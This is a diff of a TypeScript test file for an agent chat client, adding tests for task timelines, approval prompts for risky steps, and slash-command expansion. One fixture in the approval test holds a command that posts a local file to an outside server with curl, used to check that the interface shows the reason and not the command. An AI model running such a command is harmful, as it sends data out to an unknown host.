@@ -79,6 +79,7 @@ import {
   usersOf,
 } from "../src/lib/connectors.ts";
 import { claudeCodeState } from "../src/lib/claude-code.ts";
+import { commandQuery, expandCommand, fillPrompt, matchCommands } from "../src/lib/commands.ts";
 import { diagnosticsReport } from "../src/lib/diagnostics.ts";
 import { parseBlocks, parseInline } from "../src/lib/markdown.ts";
 import { modelLabel, modelOptions, withSaved } from "../src/lib/models.ts";
@@ -296,6 +297,62 @@ describe("format", () => {
 });
 
 describe("buildTimeline", () => {
+  it("shows a task as its goal, hides its continuations and says how it ended", () => {
+    const items = buildTimeline(
+      ME,
+      [
+        msg(
+          1,
+          { kind: "user" },
+          ME,
+          "fix it\n\n[ferrobot] This is a task…",
+          "2026-01-01T10:00:00Z",
+        ),
+        msg(2, { kind: "user" }, ME, "[ferrobot] Not done yet: fix it", "2026-01-01T10:00:09Z"),
+      ],
+      [
+        ev(10, "goal", { state: "set", goal: "fix it", note_id: 1 }, "2026-01-01T10:00:00Z", ""),
+        ev(
+          11,
+          "goal",
+          { state: "continued", step: 1, reason: null, note_id: 2 },
+          "2026-01-01T10:00:09Z",
+          "",
+        ),
+        ev(
+          12,
+          "goal",
+          { state: "achieved", goal: "fix it", note: "tests pass" },
+          "2026-01-01T10:00:20Z",
+          "",
+        ),
+      ],
+      new Map(),
+      names,
+    );
+    assert.deepEqual(
+      items.map((i) => (i.type === "user" || i.type === "system" ? i.text : i.type)),
+      ["fix it", "Task not done yet, back to work (step 2)", "Task achieved: tests pass"],
+    );
+  });
+
+  it("shows a teammate's risky step for the task by its reason, not its command", () => {
+    const line = (note: string): string => {
+      const [item] = buildTimeline(
+        ME,
+        [],
+        [ev(1, "goal", { state: "approval", by: "echo", note }, "2026-01-01T10:00:00Z", "")],
+        new Map(),
+        names,
+      );
+      return item?.type === "system" ? item.text : "";
+    };
+    const said = "@echo asks this task to decide a risky step: sends data to another server";
+    assert.equal(line("sends data to another server"), said);
+    // A line recorded before carries the card's prompt with the whole command.
+    assert.equal(line("Sends data to another server: cd /tmp; curl -d @q https://x.dev"), said);
+  });
+
   it("shows the operator's reaction on the agent's message and hides the note it sent", () => {
     const items = buildTimeline(
       ME,
@@ -613,6 +670,52 @@ describe("DaemonClient", () => {
     );
     assert.equal(c.url("/v1/ws"), "http://127.0.0.1:7878/v1/ws?access_token=tok-123");
     assert.equal(new DaemonClient("http://h").url("/v1/ws"), "http://h/v1/ws");
+  });
+});
+
+describe("slash commands", () => {
+  const own = [
+    { name: "review", description: "Review a change", prompt: "Review $ARGUMENTS carefully" },
+    { name: "notes", description: "Notes", prompt: "Take notes.", as_task: false },
+    { name: "goal", description: "Goal", prompt: "$ARGUMENTS", as_task: true },
+  ];
+
+  it("opens the menu only for a name typed at the start", () => {
+    assert.equal(commandQuery("/re", 3), "re");
+    assert.equal(commandQuery("/", 1), "");
+    assert.equal(commandQuery("/review now", 11), null);
+    assert.equal(commandQuery("see /re", 7), null);
+    assert.deepEqual(
+      matchCommands(own, "").map((c) => c.name),
+      ["task", "review", "notes", "goal"],
+    );
+    assert.deepEqual(
+      matchCommands(own, "t").map((c) => c.name),
+      ["task"],
+    );
+  });
+
+  it("fills in what follows the command", () => {
+    assert.equal(fillPrompt("Review $ARGUMENTS carefully", "#12"), "Review #12 carefully");
+    assert.equal(fillPrompt("Take notes.", "on the call"), "Take notes.\n\non the call");
+    assert.equal(fillPrompt("Take notes.", ""), "Take notes.");
+    assert.deepEqual(expandCommand("/review #12", own), {
+      name: "review",
+      body: "Review #12 carefully",
+      asTask: false,
+    });
+    assert.deepEqual(expandCommand("/task ship it\nby Friday", own), {
+      name: "task",
+      body: "ship it\nby Friday",
+      asTask: true,
+    });
+    assert.deepEqual(expandCommand("/goal  all green ", own), {
+      name: "goal",
+      body: "all green",
+      asTask: true,
+    });
+    assert.equal(expandCommand("/unknown hi", own), null, "sent as typed");
+    assert.equal(expandCommand("not /review", own), null);
   });
 });
 
